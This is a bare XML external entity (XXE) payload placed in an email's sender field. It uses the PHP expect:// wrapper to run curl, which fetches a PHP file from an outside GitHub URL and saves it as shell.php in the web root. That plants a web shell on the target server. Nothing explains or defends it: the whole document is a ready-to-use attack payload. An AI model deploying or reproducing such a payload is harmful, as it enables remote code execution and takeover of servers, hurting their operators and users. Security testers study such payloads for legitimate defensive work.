<!DOCTYPE email [
  <!ENTITY attack SYSTEM "expect://curl https://raw.githubusercontent.com/Hadarios/test-pages/refs/heads/main/tkt.php -o /var/www/html/shell.php">
]>
<email>
  <sender>&attack;</sender>
</email>
